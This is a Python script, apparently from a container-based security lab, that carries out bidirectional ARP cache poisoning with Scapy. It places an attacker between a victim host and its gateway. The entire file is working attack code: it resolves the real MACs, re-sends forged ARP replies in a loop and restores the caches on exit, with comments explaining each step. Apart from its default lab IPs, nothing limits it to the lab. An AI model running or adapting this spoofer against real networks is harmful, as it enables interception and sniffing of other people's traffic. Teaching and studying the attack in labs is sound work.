#!/usr/bin/env python3
"""
arp_spoof.py  --  Scapy bidirectional ARP cache poisoning (MITM)
================================================================
MITRE ATT&CK: T1557.002 (ARP Cache Poisoning) -> enables T1040 (Network Sniffing)

THE IDEA (ARP has no authentication — that's the vulnerability)
---------------------------------------------------------------
Every host keeps an ARP cache: "IP X lives at MAC Y". It fills this cache by
trusting *any* ARP reply it sees, even ones it never asked for ("gratuitous ARP").

So we lie to two machines at once:
  * Tell the VICTIM  (172.30.0.10): "the gateway 172.30.0.2 is at MY mac"
  * Tell the GATEWAY (172.30.0.2):  "the victim 172.30.0.10 is at MY mac"

Now both of them send each other's traffic to the attacker. With ip_forward=1
the attacker relays it on (so nothing breaks and nobody notices) while sniffing.

We send these lies every 2 seconds because the real ARP replies and cache
timeouts would otherwise correct the victim. Re-poisoning = staying in the middle.

USAGE (run inside the attacker container):
    docker compose exec attacker python3 /lab/attack/arp_spoof.py
    # optional: override defaults
    docker compose exec attacker python3 /lab/attack/arp_spoof.py \
        --victim 172.30.0.10 --gateway 172.30.0.2 --interval 2

Press Ctrl-C to STOP and auto-restore both ARP caches (clean before/after demo).
"""
import argparse
import sys
import time

from scapy.all import ARP, Ether, send, sendp, srp, get_if_hwaddr, conf


def mac_of(ip, iface):
    """Ask the network 'who has <ip>?' and return the MAC that answers.

    This is a normal ARP request (op=1) wrapped in a broadcast Ethernet frame.
    srp = send-and-receive at layer 2. We retry a few times because the first
    request can race container startup.
    """
    for _ in range(5):
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, iface=iface, verbose=False,
        )
        for _sent, received in ans:
            return received.hwsrc
        time.sleep(1)
    return None


def poison(target_ip, target_mac, spoof_ip, attacker_mac, iface):
    """Send ONE malicious ARP reply to `target`, claiming `spoof_ip` is us.

    op=2 is an ARP *reply*. psrc=spoof_ip (the IP we're impersonating),
    hwsrc=attacker_mac (our real MAC = where traffic will actually go).
    pdst/hwdst = who we're lying to. The target overwrites its cache entry
    for spoof_ip to point at us.
    """
    pkt = Ether(src=attacker_mac, dst=target_mac) / ARP(
        op=2,                       # 2 = "is-at" reply
        psrc=spoof_ip,              # the IP we claim to own
        hwsrc=attacker_mac,         # ...but it resolves to OUR mac
        pdst=target_ip,             # victim of the lie
        hwdst=target_mac,
    )
    sendp(pkt, iface=iface, verbose=False)


def restore(victim_ip, victim_mac, gw_ip, gw_mac, iface):
    """Undo the poison by broadcasting the TRUTH several times.

    We send correct ARP replies so each host relearns the real MACs instead of
    waiting for the cache to expire. Sent 5x to beat any packet loss.
    """
    print("[*] Restoring ARP caches to the truth...")
    for _ in range(5):
        # Tell victim the real gateway MAC
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                 psrc=gw_ip, hwsrc=gw_mac), iface=iface, verbose=False)
        # Tell gateway the real victim MAC
        send(ARP(op=2, pdst=gw_ip, hwdst=gw_mac,
                 psrc=victim_ip, hwsrc=victim_mac), iface=iface, verbose=False)
        time.sleep(0.5)
    print("[+] Caches restored. MITM removed.")


def main():
    p = argparse.ArgumentParser(description="Scapy bidirectional ARP spoofer (MITM)")
    p.add_argument("--victim", default="172.30.0.10")
    p.add_argument("--gateway", default="172.30.0.2")
    p.add_argument("--iface", default="eth0")
    p.add_argument("--interval", type=float, default=2.0,
                   help="seconds between re-poison bursts (default 2)")
    args = p.parse_args()

    conf.iface = args.iface
    attacker_mac = get_if_hwaddr(args.iface)
    print(f"[*] Attacker MAC on {args.iface}: {attacker_mac}")

    print("[*] Resolving real MACs of victim and gateway...")
    victim_mac = mac_of(args.victim, args.iface)
    gw_mac = mac_of(args.gateway, args.iface)
    if not victim_mac or not gw_mac:
        print(f"[!] Could not resolve MACs (victim={victim_mac}, gw={gw_mac}). "
              f"Are the containers up?")
        sys.exit(1)
    print(f"[+] victim  {args.victim} is really at {victim_mac}")
    print(f"[+] gateway {args.gateway} is really at {gw_mac}")

    print(f"[*] Poisoning every {args.interval}s. Ctrl-C to stop + restore.\n")
    count = 0
    try:
        while True:
            # Lie to the victim about the gateway...
            poison(args.victim, victim_mac, args.gateway, attacker_mac, args.iface)
            # ...and lie to the gateway about the victim.
            poison(args.gateway, gw_mac, args.victim, attacker_mac, args.iface)
            count += 2
            print(f"\r[+] sent {count} poisoned ARP replies "
                  f"(victim<->gateway now route through us)", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Caught Ctrl-C.")
        restore(args.victim, victim_mac, args.gateway, gw_mac, args.iface)


if __name__ == "__main__":
    main()
